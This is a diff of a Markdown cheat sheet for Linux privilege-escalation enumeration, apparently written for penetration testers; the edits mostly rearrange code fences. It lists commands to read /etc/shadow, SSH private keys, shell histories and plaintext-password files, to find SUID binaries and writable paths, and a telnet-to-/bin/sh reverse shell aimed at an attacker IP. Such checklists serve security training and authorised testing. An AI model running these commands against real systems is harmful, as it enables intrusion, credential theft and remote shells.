@@ -19,20 +19,20 @@ set
 ~~~
 
 # Aplication & Services
-~~~
 What services are running? Which service has which user privilege?
+~~~
 ps aux
 ps -ef
 top
 cat /etc/services
 ~~~
-~~~
 Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
+~~~
 ps aux | grep root
 ps -ef | grep root
 ~~~
-~~~
 What applications are installed? What version are they? Are they currently running?
+~~~
 ls -alh /usr/bin/
 ls -alh /sbin/
 dpkg -l
@@ -40,8 +40,8 @@ rpm -qa
 ls -alh /var/cache/apt/archivesO
 ls -alh /var/cache/yum/
 ~~~
-~~~
 Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
+~~~
 cat /etc/syslog.conf
 cat /etc/chttp.conf
 cat /etc/lighttpd.conf
@@ -53,8 +53,8 @@ cat /etc/httpd/conf/httpd.conf
 cat /opt/lampp/etc/httpd.conf
 ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
 ~~~
-~~~
 What jobs are scheduled?
+~~~
 crontab -l
 ls -alh /var/spool/cron
 ls -al /etc/ | grep cron
@@ -68,15 +68,15 @@ cat /etc/crontab
 cat /etc/anacrontab
 cat /var/spool/cron/crontabs/root
 ~~~
-~~~
 Any plain text usernames and/or passwords?
+~~~
 grep -i user [filename]
 grep -i pass [filename]
 grep -C 5 "password" [filename]
 find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
 ~~~
-~~~
 What other users & hosts are communicating with the system?
+~~~
 lsof -i
 lsof -i :80
 grep 80 /etc/services
@@ -87,14 +87,14 @@ chkconfig --list
 chkconfig --list | grep 3:on
 last
 ~~~
-~~~
 Have you got a shell? Can you interact with the system?
+~~~
 nc -lvp 4444    # Attacker. Input (Commands)
 nc -lvp 4445    # Attacker. Ouput (Results)
 telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
 ~~~
-~~~
 Confidential Information & Users
+~~~
 Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
 id
 who
@@ -106,41 +106,41 @@ awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
 cat /etc/sudoers
 sudo -l
 ~~~
-~~~
 What sensitive files can be found?
+~~~
 cat /etc/passwd
 cat /etc/group
 cat /etc/shadow
 ls -alh /var/mail/
 ~~~
-~~~
 Anything "interesting" in the home directorie(s)? If it's possible to access
+~~~
 ls -ahlR /root/
 ls -ahlR /home/
 ~~~
-~~~
 Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for password
+~~~
 cat /var/apache2/config.inc
 cat /var/lib/mysql/mysql/user.MYD
 cat /root/anaconda-ks.cfg
 ~~~
-~~~
 What has the user being doing? Is there any password in plain text? What have they been edting?
+~~~
 cat ~/.bash_history
 cat ~/.nano_history
 cat ~/.atftp_history
 cat ~/.mysql_history
 cat ~/.php_history
 ~~~
-~~~
 What user information can be found?
+~~~
 cat ~/.bashrc
 cat ~/.profile
 cat /var/mail/root
 cat /var/spool/mail/root
 ~~~
-~~~
 Can private-key information be found?
+~~~
 cat ~/.ssh/authorized_keys
 cat ~/.ssh/identity.pub
 cat ~/.ssh/identity
@@ -157,9 +157,9 @@ cat /etc/ssh/ssh_host_rsa_key
 cat /etc/ssh/ssh_host_key.pub
 cat /etc/ssh/ssh_host_key
 ~~~
-~~~
-File Systems
+# File Systems
 Which configuration files can be written in /etc/? Able to reconfigure a service?
+~~~
 ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
 ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
 ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
@@ -167,8 +167,8 @@ ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
 find /etc/ -readable -type f 2>/dev/null               # Anyone
 find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
 ~~~
-~~~
 What can be found in /var/ ?
+~~~
 ls -alh /var/log
 ls -alh /var/mail
 ls -alh /var/spool
@@ -177,16 +177,16 @@ ls -alh /var/lib/pgsql
 ls -alh /var/lib/mysql
 cat /var/lib/dhcp3/dhclient.leases
 ~~~
-~~~
 Any settings/files (hidden) on website? Any settings file with database information?
+~~~
 ls -alhR /var/www/
 ls -alhR /srv/www/htdocs/
 ls -alhR /usr/local/www/apache22/data/
 ls -alhR /opt/lampp/htdocs/
 ls -alhR /var/www/html/
 ~~~
-~~~
 Is there anything in the log file(s) (Could help with "Local File Includes"!)
+~~~
 cat /etc/httpd/logs/access_log
 cat /etc/httpd/logs/access.log
 cat /etc/httpd/logs/error_log
@@ -228,17 +228,17 @@ ls -alh /var/log/samba/
 Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
 Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/
 ~~~
-~~~
 How are file-systems mounted?
+~~~
 mount
 df -h
 ~~~
-~~~
 Are there any unmounted file-systems?
+~~~
 cat /etc/fstab
 ~~~
-~~~
 What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
+~~~
 find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
 find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
 find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
@@ -248,8 +248,6 @@ for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f
 
 # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
-~~~
-~~~
 Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
 find / -writable -type d 2>/dev/null      # world-writeable folders
 find / -perm -222 -type d 2>/dev/null     # world-writeable folders
@@ -257,20 +255,20 @@ find / -perm -o w -type d 2>/dev/null     # world-writeable folders
 find / -perm -o x -type d 2>/dev/null     # world-executable folders
 find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
 ~~~
-~~~
 Any "problem" files? Word-writeable, "nobody" files
+~~~
 find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
 find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
 ~~~
-~~~
 Preparation & Finding Exploit Code
+~~~
 What development tools/languages are installed/supported?	
 find / -name perl*
 find / -name python*
 find / -name gcc*
 find / -name cc
 ~~~
-# How can files be uploaded?
+How can files be uploaded?
 ~~~
 find / -name wget
 find / -name nc*
